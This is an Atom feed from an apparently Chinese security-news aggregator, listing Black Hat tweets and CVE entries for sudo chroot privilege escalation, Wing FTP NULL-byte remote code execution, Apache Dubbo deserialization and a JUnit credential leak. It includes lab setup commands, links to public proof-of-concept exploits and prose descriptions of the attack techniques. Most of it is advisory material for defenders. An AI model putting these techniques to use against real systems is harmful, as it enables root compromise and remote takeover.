<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>liancc&#39; infos blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-07-02T02:00:52.442Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>lianccc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/07/02/twitter_4037750461/"/>
    <id>http://example.com/2025/07/02/twitter_4037750461/</id>
    <published>2025-07-02T02:00:52.447Z</published>
    <updated>2025-07-02T02:00:52.442Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 准备好加速你的#网络安全职业生涯了吗？🧑‍💻快来参加2025年Black Hat USA（8月6-7日）的专业发展区，这里有专家主导的会议，旨在帮助你在行业中脱颖而出！#BHUSA <a href="https://t.co/fA9RTp9inY">https://t.co/fA9RTp9inY</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940222141565169811">https://x.com/BlackHatEvents/status/1940222141565169811</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 准备好加速你的#网络安全职业生涯了吗？🧑‍💻快来参加2025年Black Hat USA（8月6-7日）的专业发展区，这里有专家主导的会议，旨</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>zoomeye_team twitter update</title>
    <link href="http://example.com/2025/07/02/twitter_537760268/"/>
    <id>http://example.com/2025/07/02/twitter_537760268/</id>
    <published>2025-07-02T02:00:35.454Z</published>
    <updated>2025-07-02T02:00:35.450Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> zoomeye_team</p><p><strong>推文：</strong> CVE-2025-47812：Wing FTP服务器远程代码执行漏洞<br>🔥概念验证(PoC)：<a href="https://t.co/k0h56Qz4gh">https://t.co/k0h56Qz4gh</a> <a href="https://t.co/9uk5pmtREj">https://t.co/9uk5pmtREj</a></p><p><strong>链接：</strong> <a href="https://x.com/zoomeye_team/status/1940227988282642439">https://x.com/zoomeye_team/status/1940227988282642439</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; zoomeye_team&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-47812：Wing FTP服务器远程代码执行漏洞&lt;br&gt;🔥概念验证(PoC)：&lt;a href=&quot;https://t.co/k0h</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="zoomeye_team" scheme="http://example.com/tags/zoomeye-team/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2025-5472 Denial of Service via Uncontrolled Recursive JSON Parsing in JSONReader</title>
    <link href="http://example.com/2025/07/02/other_4078983740/"/>
    <id>http://example.com/2025/07/02/other_4078983740/</id>
    <published>2025-07-02T01:30:20.817Z</published>
    <updated>2025-07-02T01:30:20.812Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://huntr.com/bounties/df187bda-7911-4823-a19a-e15b2c66b0d4">https://huntr.com/bounties/df187bda-7911-4823-a19a-e15b2c66b0d4</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://huntr.com/bounties/df187bda-7911-4823-a19a-e15b2c66b0d4&quot;&gt;https://huntr.com/bounties/df187bda-7911-4</summary>
      
    
    
    
    <category term="其他" scheme="http://example.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="huntr.com" scheme="http://example.com/tags/huntr-com/"/>
    
  </entry>
  
  <entry>
    <title>音频设备中的蓝牙漏洞可被利用来监视用户</title>
    <link href="http://example.com/2025/07/02/weixin_2341159451/"/>
    <id>http://example.com/2025/07/02/weixin_2341159451/</id>
    <published>2025-07-02T01:06:27.505Z</published>
    <updated>2025-07-02T01:06:27.504Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/YrcS0SLdbZPerBZmuckUHw">https://mp.weixin.qq.com/s/YrcS0SLdbZPerBZmuckUHw</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/YrcS0SLdbZPerBZmuckUHw&quot;&gt;https://mp.weixin.</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>伊以战争期间，80多个黑客组织对 20 多个关键部门发动攻击</title>
    <link href="http://example.com/2025/07/02/weixin_786020528/"/>
    <id>http://example.com/2025/07/02/weixin_786020528/</id>
    <published>2025-07-02T01:06:26.144Z</published>
    <updated>2025-07-02T01:06:26.144Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/JE002hFbYqiYUxSBZJemGw">https://mp.weixin.qq.com/s/JE002hFbYqiYUxSBZJemGw</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/JE002hFbYqiYUxSBZJemGw&quot;&gt;https://mp.weixin.</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Linux Sudo chroot 漏洞使黑客能够将权限提升至 Root</title>
    <link href="http://example.com/2025/07/02/weixin_1650121735/"/>
    <id>http://example.com/2025/07/02/weixin_1650121735/</id>
    <published>2025-07-02T01:06:24.540Z</published>
    <updated>2025-07-02T01:06:24.540Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/bXfmnNE4wUAy_hIIOM9bCg">https://mp.weixin.qq.com/s/bXfmnNE4wUAy_hIIOM9bCg</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/bXfmnNE4wUAy_hIIOM9bCg&quot;&gt;https://mp.weixin.</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Sudo chroot 本地权限提升漏洞</title>
    <link href="http://example.com/2025/07/02/github_227185281/"/>
    <id>http://example.com/2025/07/02/github_227185281/</id>
    <published>2025-07-02T00:15:18.682Z</published>
    <updated>2025-07-02T00:15:18.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Sudo chroot 本地权限提升漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-32463</li></ul><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该漏洞存在于sudo的<code>--chroot</code>选项中，允许攻击者通过精心构造的<code>nsswitch.conf</code>文件加载恶意的NSS模块，从而获得root shell访问权限。影响版本为1.9.14至1.9.17。</p><p><strong>产品厂商：</strong> sudo.ws</p><p><strong>产品名称：</strong> sudo</p><p><strong>影响版本：</strong> 1.9.14 &lt;&#x3D; version &lt;&#x3D; 1.9.17</p><p><strong>来源：</strong> <a href="https://github.com/Adonijah01/cve-2025-32463-lab">https://github.com/Adonijah01/cve-2025-32463-lab</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>Dockerfile</li><li>README.md</li><li>sudo-chwoot.sh</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-32463-–-Sudo-chroot-Local-Privilege-Escalation-Lab"><a href="#CVE-2025-32463-–-Sudo-chroot-Local-Privilege-Escalation-Lab" class="headerlink" title="CVE-2025-32463 – Sudo chroot Local Privilege Escalation Lab"></a>CVE-2025-32463 – Sudo chroot Local Privilege Escalation Lab</h2><p>This repository contains a Docker-based lab and proof-of-concept exploit for <a href="https://www.sudo.ws/security/advisories/chroot_bug">CVE-2025-32463</a>, a local privilege escalation vulnerability in <code>sudo</code> (versions 1.9.14 to 1.9.17).</p><h3 id="🚨-Disclaimer"><a href="#🚨-Disclaimer" class="headerlink" title="🚨 Disclaimer"></a>🚨 Disclaimer</h3><p>This code is for educational and authorized testing purposes only. Do not use on systems you do not own or have explicit permission to test.</p><h3 id="Lab-Features"><a href="#Lab-Features" class="headerlink" title="Lab Features"></a>Lab Features</h3><ul><li>Vulnerable Ubuntu 24.04 container with <code>sudo</code> 1.9.15p5</li><li>Non-privileged user (<code>labuser</code>)</li><li>Exploit script: <code>sudo-chwoot.sh</code></li><li>Dockerfile for easy setup</li></ul><h3 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/adonijah01/cve-2025-32463-lab.git<br><span class="hljs-built_in">cd</span> cve-2025-32463-lab<br>docker build -t cve-2025-32463-lab .<br>docker run --<span class="hljs-built_in">rm</span> -it --privileged cve-2025-32463-lab<br></code></pre></td></tr></table></figure><p>Inside the container:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~<br>./sudo-chwoot.sh<br></code></pre></td></tr></table></figure><h3 id="Exploit-Overview"><a href="#Exploit-Overview" class="headerlink" title="Exploit Overview"></a>Exploit Overview</h3><p>The exploit abuses the <code>--chroot</code> option in sudo and a crafted <code>nsswitch.conf</code> to load a malicious NSS module, resulting in root shell access.</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://www.sudo.ws/security/advisories/chroot_bug">Sudo Security Advisory</a></li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-32463">CVE-2025-32463 in the CVE database</a></li><li><a href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot">Stratascale Advisory</a> - Original research and PoC concept</li></ul><h3 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h3><p>Exploit concept and vulnerability details referenced from the official Sudo advisory, CVE database, and <a href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot">Stratascale’s research</a>.</p><p>Stay safe and use responsibly!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Sudo chroot 本地权限提升漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/07/02/twitter_347486431/"/>
    <id>http://example.com/2025/07/02/twitter_347486431/</id>
    <published>2025-07-02T00:00:26.965Z</published>
    <updated>2025-07-02T00:00:26.963Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 第十届云安全峰会将于2025年9月30日在多伦多市中心的Metro Toronto Convention Centre举行。云安全峰会是加拿大领先的云安全活动，主题演讲、小组讨论、交流机会等精彩内容不容错过 &gt;&gt; <a href="https://t.co/FlVBXW1acF">https://t.co/FlVBXW1acF</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940190935200977248">https://x.com/BlackHatEvents/status/1940190935200977248</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 第十届云安全峰会将于2025年9月30日在多伦多市中心的Metro Toronto Convention Centre举行。云安全峰会是加拿大领先</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/07/01/twitter_2320626213/"/>
    <id>http://example.com/2025/07/01/twitter_2320626213/</id>
    <published>2025-07-01T23:00:27.030Z</published>
    <updated>2025-07-01T23:00:27.027Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 🔐 掌握云原生世界的攻防艺术 - 加入网络安全专家@jaybeale —— Bastille Linux、Peirates及Bust-a-Kube的创造者，参加Black Hat 2025秋季培训的4天全实践在线课程！&gt;&gt; <a href="https://t.co/pt9IlRxmQW">https://t.co/pt9IlRxmQW</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940174829769941402">https://x.com/BlackHatEvents/status/1940174829769941402</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🔐 掌握云原生世界的攻防艺术 - 加入网络安全专家@jaybeale —— Bastille Linux、Peirates及Bust-a-Kub</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>junit-platform-reporting can leak Git credentials through its OpenTestReportGeneratingListener</title>
    <link href="http://example.com/2025/07/01/github_3786395212/"/>
    <id>http://example.com/2025/07/01/github_3786395212/</id>
    <published>2025-07-01T23:00:06.313Z</published>
    <updated>2025-07-01T23:00:06.311Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-m43g-m425-p68x">https://github.com/advisories/GHSA-m43g-m425-p68x</a></p><p><strong>仓库 Star：</strong> 6715</p><p><strong>CVSS 评分：</strong> 5.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/junit-team/junit-framework/security/advisories/GHSA-m43g-m425-p68x">https://github.com/junit-team/junit-framework/security/advisories/GHSA-m43g-m425-p68x</a></p></li><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-53103">https://nvd.nist.gov/vuln/detail/CVE-2025-53103</a></p></li><li><p><a href="https://github.com/junit-team/junit-framework/commit/d4fc834c8c1c0b3168cd030c13551d1d041f51bc">https://github.com/junit-team/junit-framework/commit/d4fc834c8c1c0b3168cd030c13551d1d041f51bc</a></p></li><li><p><a href="https://github.com/junit-team/junit-framework/blob/6b7764dac92fd35cb348152d1b37f8726875a4e0/junit-platform-reporting/src/main/java/org/junit/platform/reporting/open/xml/OpenTestReportGeneratingListener.java#L183">https://github.com/junit-team/junit-framework/blob/6b7764dac92fd35cb348152d1b37f8726875a4e0/junit-platform-reporting/src/main/java/org/junit/platform/reporting/open/xml/OpenTestReportGeneratingListener.java#L183</a></p></li><li><p><a href="https://github.com/advisories/GHSA-m43g-m425-p68x">https://github.com/advisories/GHSA-m43g-m425-p68x</a></p></li></ul><p><strong>描述：</strong></p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>This vulnerability affects JUnit’s support for writing Open Test Reporting XML files which is an opt-in feature of <code>junit-platform-reporting</code>.</p><p>If a repository is cloned using a GitHub token or other credentials in its URL, for example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://<span class="hljs-variable">$&#123;GH_APP&#125;</span>:<span class="hljs-variable">$&#123;GH_TOKEN&#125;</span>@github.com/example/example.git<br></code></pre></td></tr></table></figure><p>The credentials are captured by <code>OpenTestReportGeneratingListener</code> which produces (trimmed for brevity):</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">infrastructure</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">git:repository</span> <span class="hljs-attr">originUrl</span>=<span class="hljs-string">&quot;https://username:token@github.com/example/example.git&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">infrastructure</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><p><a href="https://github.com/junit-team/junit5/blob/6b7764dac92fd35cb348152d1b37f8726875a4e0/junit-platform-reporting/src/main/java/org/junit/platform/reporting/open/xml/OpenTestReportGeneratingListener.java#L183">https://github.com/junit-team/junit5/blob/6b7764dac92fd35cb348152d1b37f8726875a4e0/junit-platform-reporting/src/main/java/org/junit/platform/reporting/open/xml/OpenTestReportGeneratingListener.java#L183</a></p><p>I think this should be configurable in some way to exclude select git information or exclude it entirely.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><ol><li>Clone a repo using a GitHub token as shown above.</li><li>Enable the listener <code>junit.platform.reporting.open.xml.enabled=true</code></li><li>Observe report captures credentials</li></ol><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>Depending on the level of access of the token, it can be nothing, limited, or everything.</p><p>If these test reports are published or stored anywhere public, then there is the possibility that a rouge attacker can steal the token and perform elevated actions by impersonating the user or app.</p><h3 id="Resolution"><a href="#Resolution" class="headerlink" title="Resolution"></a>Resolution</h3><p>JUnit 5.13.2 and later replace credentials in the URL with <code>***</code>. Moreover, including any Git metadata in the XML output is now an opt-in feature that can be enabled via the new <code>junit.platform.reporting.open.xml.git.enabled=true</code> configuration parameter but is not included by default.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-m43g-m425-p68x&quot;&gt;https://github.com/advisories/GHSA-m43g-m425-p68x&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Apache Dubbo 反序列化漏洞</title>
    <link href="http://example.com/2025/07/01/github_3489987082/"/>
    <id>http://example.com/2025/07/01/github_3489987082/</id>
    <published>2025-07-01T22:15:18.302Z</published>
    <updated>2025-07-01T22:15:18.298Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache Dubbo 反序列化漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-17564</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Apache Dubbo 2.7.0至2.7.4、2.6.0至2.6.7及所有2.5.x版本中存在反序列化漏洞，由于在HTTP POST请求中接受不受信任的Java对象，攻击者可以在启用HTTP的情况下完全控制Provider实例，利用此漏洞需要攻击者发送恶意的Java对象。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Dubbo</p><p><strong>影响版本：</strong> 2.5.x, 2.6.0 &lt;&#x3D; version &lt;&#x3D; 2.6.7, 2.7.0 &lt;&#x3D; version &lt;&#x3D; 2.7.4</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12444">https://github.com/projectdiscovery/nuclei-templates/issues/12444</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Apache Dubbo versions 2.7.0 to 2.7.4, 2.6.0 to 2.6.7, and all 2.5.x versions contain an insecure deserialization caused by accepting untrusted Java objects in HTTP POST requests, letting attackers fully compromise a Provider instance if HTTP is enabled, exploit requires attacker to send malicious Java object.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://github.com/fairyming/CVE-2019-17564">https://github.com/fairyming/CVE-2019-17564</a></li><li><a href="https://github.com/Dor-Tumarkin/CVE-2019-17564-FastJson-Gadget">https://github.com/Dor-Tumarkin/CVE-2019-17564-FastJson-Gadget</a></li><li><a href="https://github.com/Exploit-3389/CVE-2019-17564">https://github.com/Exploit-3389/CVE-2019-17564</a></li><li><a href="https://github.com/Hu3sky/CVE-2019-17564">https://github.com/Hu3sky/CVE-2019-17564</a></li><li><a href="https://github.com/Jaky5155/CVE-2019-17564">https://github.com/Jaky5155/CVE-2019-17564</a></li><li><a href="https://github.com/r00t4dm/CVE-2019-17564">https://github.com/r00t4dm/CVE-2019-17564</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-NA"><a href="#Shodan-Query-NA" class="headerlink" title="Shodan Query: NA"></a>Shodan Query: <code>NA</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache Dubbo 反序列化漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/07/01/twitter_645365869/"/>
    <id>http://example.com/2025/07/01/twitter_645365869/</id>
    <published>2025-07-01T22:00:26.091Z</published>
    <updated>2025-07-01T22:00:26.087Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 🚀 新前沿，新威胁 🌌 加入我们在Black Hat USA的震撼会议，将#网络安全推向一个全新的高度 🌍➡️🛰️  #BHUSA 2025年“简报燃烧、垃圾处理、航天器坠毁：一系列足以终结你太空任务的漏洞集锦” &gt;&gt; <a href="https://t.co/u4vPVOWLel">https://t.co/u4vPVOWLel</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940158975275573755">https://x.com/BlackHatEvents/status/1940158975275573755</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚀 新前沿，新威胁 🌌 加入我们在Black Hat USA的震撼会议，将#网络安全推向一个全新的高度 🌍➡️🛰️  #BHUSA 202</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>Wing FTP Server NULL-byte Authentication Bypass</title>
    <link href="http://example.com/2025/07/01/github_3107209206/"/>
    <id>http://example.com/2025/07/01/github_3107209206/</id>
    <published>2025-07-01T21:15:27.059Z</published>
    <updated>2025-07-01T21:15:27.053Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Wing FTP Server NULL-byte Authentication Bypass</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-47812</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Wing FTP Server 存在一个通过NULL字节（%00）截断漏洞（CVE-2025-47812），允许通过认证绕过执行任意Lua代码。攻击者可以通过在用户名中注入NULL字节和Lua负载，使得C++认证例程仅验证前缀，而完整字符串未经过滤写入会话文件，随后以root&#x2F;SYSTEM权限执行，导致远程代码执行。</p><p><strong>产品厂商：</strong> Wing FTP Server</p><p><strong>产品名称：</strong> Wing FTP Server</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/5b268bd4b408e61e5fb8479823fbe72d670d3110/modules%2Fexploits%2Fmulti%2Fhttp%2Fwingftp_null_byte_rce.rb">https://github.com/rapid7/metasploit-framework/blob/5b268bd4b408e61e5fb8479823fbe72d670d3110/modules%2Fexploits%2Fmulti%2Fhttp%2Fwingftp_null_byte_rce.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 